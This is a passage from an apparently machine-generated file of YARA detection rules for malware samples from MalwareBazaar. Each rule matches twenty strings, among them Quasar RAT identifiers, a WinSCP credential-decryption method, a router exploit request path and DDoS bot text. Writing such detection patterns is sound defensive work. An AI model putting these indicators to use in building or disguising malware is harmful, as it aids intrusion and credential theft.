        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 140KB and
        all of them
}

rule Windows_141262cbd24e43f4c8911c32896fe6c1f0f5e171e8e6e6bd26a24a7bfde0dcd0
{
    meta:
        description = "Auto ML: 141262cbd24e43f4c8911c32896fe6c1f0f5e171e8e6e6bd26a24a7bfde0dcd0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "Kernel32.dll"
        $s3 = "GetM"
        $s4 = "LoadLibrary"
        $s5 = "windo"
        $s6 = "USER3o"
        $s7 = "GsET"
        $s8 = "CmdT\""
        $s9 = "4q?=MODULE"
        $s10 = "KERNEL32.DLL"
        $s11 = "ADVAPI32.dll"
        $s12 = "COMCTL32.dll"
        $s13 = "comdlg32.dll"
        $s14 = "OLEAUT32.dll"
        $s15 = "SHELL32.dll"
        $s16 = "USER32.dll"
        $s17 = "WINMM.dll"
        $s18 = "WINSPOOL.DRV"
        $s19 = "LoadLibraryA"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 593KB and
        all of them
}

rule Windows_c22db1b22fbd99cd732c0f0ba23a223f686182f192f85e3ff2d9ed88d4554a8d
{
    meta:
        description = "Auto ML: c22db1b22fbd99cd732c0f0ba23a223f686182f192f85e3ff2d9ed88d4554a8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB and
        all of them
}

rule Linux_c253c7a116d59836bb6bc7c097536dfc7ed17dce09e73d2958ef0a7b72fcdfed
{
    meta:
        description = "Auto ML: c253c7a116d59836bb6bc7c097536dfc7ed17dce09e73d2958ef0a7b72fcdfed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB and
        all of them
}

rule Linux_c26b5b6dc1550248d43303a082d2af185dea234510869872dda15fcd2056353f
{
    meta:
        description = "Auto ML: c26b5b6dc1550248d43303a082d2af185dea234510869872dda15fcd2056353f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB and
        all of them
}

rule Windows_c2c188e1268c54261a51deaee8c99af06ec604bf7e873c88e01e3b3d95e0d028
{
    meta:
        description = "Auto ML: c2c188e1268c54261a51deaee8c99af06ec604bf7e873c88e01e3b3d95e0d028"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 278KB and
        all of them
}

rule Android_c2cf46261df0f61df62319361825093b588b28e77bde74c92968a3631090f6d8
{
    meta:
        description = "Auto ML: c2cf46261df0f61df62319361825093b588b28e77bde74c92968a3631090f6d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "WiNf"
        $s2 = "bwin"
        $s3 = "fwin"
        $s4 = "cmdccC&"
        $s5 = "classes.dex/layout/abc_action_mode_close_item_material.xml"
        $s6 = "resources.arsc/layout/loading.xml"
        $s7 = "AndroidManifest.xml/layout/notification_template_custom_big.xml"
        $s8 = "resources.arsc/layout/notification_template_icon_group.xml"
        $s9 = "classes.dex/layout/notification_template_part_chronometer.xmlm"
        $s10 = "AndroidManifest.xml/layout/notification_template_part_time.xmlm"
        $s11 = "..res/layout/notification_template_part_time.xml"
        $s12 = "55res/layout/notification_template_part_chronometer.xml"
        $s13 = "//res/layout/notification_template_icon_group.xml"
        $s14 = "//res/layout/notification_template_custom_big.xml"
        $s15 = "res/layout/loading.xml"
        $s16 = "22res/layout/abc_action_mode_close_item_material.xml"
        $s17 = "System Keyboard"
        $s18 = ",,androidx.appcompat.app.AppCompatViewInflater"
        $s19 = "$$problemsobuucbaqeyxblttjgetckshqk919"
        $s20 = "##alreadyeedcchrnxnqmewthwvjrifzys901"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3961KB and
        all of them
}

rule Windows_c2d8860861cb7eb12a683e0b7b70993484df6d76edbc3f586b0e537251666144
{
    meta:
        description = "Auto ML: c2d8860861cb7eb12a683e0b7b70993484df6d76edbc3f586b0e537251666144"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "History.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{25763981-3AF8-4881-AA80-EDCF983526E8}"
        $s15 = "<Module>{6a5f0203-9e35-44d6-b509-c84e615ae992}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB and
        all of them
}

rule Windows_c328534fe8df97ccd8ff9fec54f6760f2aa9c0af3f4aa49268d83c1bbafcde19
{
    meta:
        description = "Auto ML: c328534fe8df97ccd8ff9fec54f6760f2aa9c0af3f4aa49268d83c1bbafcde19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Windows_c32e369709b4820964c1ec126228f516bb4fe56e138ecbe5a3828603c3f8b7a7
{
    meta:
        description = "Auto ML: c32e369709b4820964c1ec126228f516bb4fe56e138ecbe5a3828603c3f8b7a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "loadingCircle1"
        $s5 = "openFileDialog1"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "get_SelectedTab"
        $s9 = "setPathDoc"
        $s10 = "add_Load"
        $s11 = "frmSelPath_Load"
        $s12 = "frmMain_Load"
        $s13 = "set_RotationSpeed"
        $s14 = "get_Enabled"
        $s15 = "set_Enabled"
        $s16 = "get_Cancelled"
        $s17 = "add_FormClosed"
        $s18 = "frmLoading_FormClosed"
        $s19 = "frmMain_FormClosed"
        $s20 = "get_HasExited"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 687KB and
        all of them
}

rule Linux_c34149e0998cb5b0406dc02b120d10aa1ba5f4c333fced32f29fbb868b27a9d7
{
    meta:
        description = "Auto ML: c34149e0998cb5b0406dc02b120d10aa1ba5f4c333fced32f29fbb868b27a9d7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "time.DatH"
        $s2 = ";fileu"
        $s3 = "FileOpti"
        $s4 = "FileOptif"
        $s5 = "9windu"
        $s6 = ":windu"
        $s7 = "8open"
        $s8 = ":fileu7H"
        $s9 = ";file"
        $s10 = "8fileu"
        $s11 = "8fileuBA"
        $s12 = "loadH"
        $s13 = ":httptD"
        $s14 = ":httpu"
        $s15 = "CMdRe"
        $s16 = ":httpumH"
        $s17 = ":httpt9"
        $s18 = "}setH"
        $s19 = "File"
        $s20 = "Load"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 13844KB and
        all of them
}

rule Windows_c34c70691370321a3b75f9515d54f68c2135467ee2d0784680350cfd12f97021
{
    meta:
        description = "Auto ML: c34c70691370321a3b75f9515d54f68c2135467ee2d0784680350cfd12f97021"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteDirectory>b__0"
        $s5 = "<DeleteDirectory>b__1"
        $s6 = "read32"
        $s7 = "read16"
        $s8 = "read8"
        $s9 = "<Module>"
        $s10 = "MSP_SET_MISC"
        $s11 = "HEADER_CMD"
        $s12 = "MSP_EEPROM_WRITE"
        $s13 = "MSP_RESET_CONF"
        $s14 = "MSP_SET_RC_TUNING"
        $s15 = "get_ASCII"
        $s16 = "System.IO"
        $s17 = "System.Windows.Media"
        $s18 = "FileData"
        $s19 = "fileData"
        $s20 = "get_KeyData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 941KB and
        all of them
}

rule Linux_1412ea7b5bdeda8965e74ca3c35e24a73010bf2d5858a7c3560243fd74658aed
{
    meta:
        description = "Auto ML: 1412ea7b5bdeda8965e74ca3c35e24a73010bf2d5858a7c3560243fd74658aed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 123KB and
        all of them
}

rule Windows_c3509aae7603690ed7a902f1d9b12ef6c2a9ba1909dbefc61d74372041be75c6
{
    meta:
        description = "Auto ML: c3509aae7603690ed7a902f1d9b12ef6c2a9ba1909dbefc61d74372041be75c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Collections.Generic"
        $s6 = "Form1_Load"
        $s7 = "add_Load"
        $s8 = "set_FormattingEnabled"
        $s9 = "EventDeleted"
        $s10 = "set_AutoScaleMode"
        $s11 = "set_ColumnHeadersHeightSizeMode"
        $s12 = "GetTypeFromHandle"
        $s13 = "set_BorderStyle"
        $s14 = "set_Name"
        $s15 = "get_Culture"
        $s16 = "set_Culture"
        $s17 = "ApplicationSettingsBase"
        $s18 = "get_RowTemplate"
        $s19 = "titleToDelete"
        $s20 = "STAThreadAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 614KB and
        all of them
}

rule Windows_c354af7579f76000bf9f106f484fb66a5d5c5a41f477ca5121886cbb15fbdca7
{
    meta:
        description = "Auto ML: c354af7579f76000bf9f106f484fb66a5d5c5a41f477ca5121886cbb15fbdca7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3077KB and
        all of them
}

rule Windows_c38326b43ae382c6eb3844f0a6beb4c321d8eeceecfdf9e503032f94a650d4b4
{
    meta:
        description = "Auto ML: c38326b43ae382c6eb3844f0a6beb4c321d8eeceecfdf9e503032f94a650d4b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "mnuProcessScale200"
        $s5 = "mnuProcessScale50"
        $s6 = "ReadInt32"
        $s7 = "<Module>"
        $s8 = "mnuProcessMirrorH"
        $s9 = "getVIN"
        $s10 = "setVIN"
        $s11 = "System.IO"
        $s12 = "getCNP"
        $s13 = "mnuProcessMirrorV"
        $s14 = "mnuProcessFlipX"
        $s15 = "mnuProcessFlipY"
        $s16 = "System.Media"
        $s17 = "get_karma"
        $s18 = "Form1_Load"
        $s19 = "add_Load"
        $s20 = "rent_it_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 678KB and
        all of them
}

rule Windows_c39940efbbf790a7070e9fcf43cd2138c1791ed72cca1ddfdf2c9e4de549d485
{
    meta:
        description = "Auto ML: c39940efbbf790a7070e9fcf43cd2138c1791ed72cca1ddfdf2c9e4de549d485"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "SetDllDirectoryW"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "CorExitProcess"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "`local static thread guard'"
        $s17 = "`placement delete[] closure'"
        $s18 = "`placement delete closure'"
        $s19 = "delete[]"
        $s20 = "delete"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2311KB and
        all of them
}

rule Windows_c3a0685e511cbe40ba729b0e396862ecc14003289fde5001f2842ccfb9363c02
{
    meta:
        description = "Auto ML: c3a0685e511cbe40ba729b0e396862ecc14003289fde5001f2842ccfb9363c02"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "=USERu"
        $s7 = "Camellia for x86 by <appro@openssl.org>"
        $s8 = "AES for Intel AES-NI, CRYPTOGAMS by <appro@openssl.org>"
        $s9 = "AES for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s10 = "RC4 for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s11 = "SHA1 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s12 = "SHA256 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s13 = "DlSHA512 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s14 = "GHASH for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s15 = "Montgomery Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s16 = "GF(2^m) Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s17 = "ios_base::eofbit set"
        $s18 = "ios_base::failbit set"
        $s19 = "ios_base::badbit set"
        $s20 = "boost::thread_resource_error"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2209KB and
        all of them
}

rule Windows_c3bf7178d9721dfbf12481c059e06ebc719b2ecc442396a3659b6054cc57eb72
{
    meta:
        description = "Auto ML: c3bf7178d9721dfbf12481c059e06ebc719b2ecc442396a3659b6054cc57eb72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "-The lower bound of target array must be zero."
        $s6 = "MTarget array type is not compatible with the type of items in the collection."
        $s7 = "ECannot create file because the specified file name is already in use."
        $s8 = "!Buffer offset cannot be negative."
        $s9 = "Compound File API failure."
        $s10 = "UObject used as metadata key must be an instance of the CompoundFileMetadataKey class."
        $s11 = "DCannot perform this operation when the package is in read-only mode."
        $s12 = "OFailed to read a stream type table - the data appears to be a different format."
        $s13 = "7CompoundFileReference: Corrupted CompoundFileReference."
        $s14 = "ZCompoundFileReference: Corrupted CompoundFileReference - multiple stream components found."
        $s15 = "jCompoundFileReference: Corrupted CompoundFileReference - storage component cannot follow stream component."
        $s16 = "4Cannot create data storage because access is denied."
        $s17 = "!Cannot create a read-only stream."
        $s18 = "0Cannot create new package on a read-only stream."
        $s19 = ".Cannot create a stream in a read-only package."
        $s20 = "2Cannot create StorageRoot on a nonreadable stream."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB and
        all of them
}

rule Windows_c3c3f9bd4ca07872c4b598425966401ef02cf224fae1e67cc9f7d5867cd9ed16
{
    meta:
        description = "Auto ML: c3c3f9bd4ca07872c4b598425966401ef02cf224fae1e67cc9f7d5867cd9ed16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.reloc"
        $s2 = "@.rsrc"
        $s3 = "cmdc"
        $s4 = "fQwiN"
        $s5 = "GetProcAddress"
        $s6 = "USER32.dll"
        $s7 = "GetUserObjectInformationW"
        $s8 = "RegSetValueExA"
        $s9 = "InternetReadFile"
        $s10 = "LoadLibraryA"
        $s11 = "GetProcessWindowStation"
        $s12 = "GEtX"
        $s13 = "SHELL32.dll"
        $s14 = "GetModuleHandleA"
        $s15 = "GetModuleFileNameW"
        $s16 = "WinAyv"
        $s17 = "ADVAPI32.dll"
        $s18 = "SetThreadAffinityMask"
        $s19 = "GetProcessAffinityMask"
        $s20 = "WININET.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7976KB and
        all of them
}

rule Linux_c43ecd98345ec376201ffaeb86beddf9c804ff017262879dceeb81fa2ddf39ad
{
    meta:
        description = "Auto ML: c43ecd98345ec376201ffaeb86beddf9c804ff017262879dceeb81fa2ddf39ad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
